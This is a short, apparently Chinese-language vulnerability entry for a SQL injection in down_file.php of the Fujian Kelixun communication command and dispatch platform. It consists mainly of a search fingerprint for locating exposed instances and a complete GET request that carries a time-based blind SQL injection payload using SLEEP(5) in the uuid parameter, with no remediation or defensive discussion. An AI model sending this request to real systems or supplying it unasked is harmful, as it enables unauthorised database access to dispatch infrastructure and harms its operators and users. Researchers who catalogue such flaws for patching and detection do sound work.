# 福建科立迅通信指挥调度平台down_file.phpsql注入漏洞

福建科立迅通信指挥调度平台down_file.php ｜ SQL注入 ｜ —
- **指纹**：`body="app/structure/departments.php"`
- **请求**：`GET /api/client/down_file.php?uuid=1%27%20AND%20(SELECT%205587%20FROM%20(SELECT(SLEEP(5)))pwaA)%20AND%20%27dDhF%27=%27dDhF HTTP/1.1`
- **响应特征**：200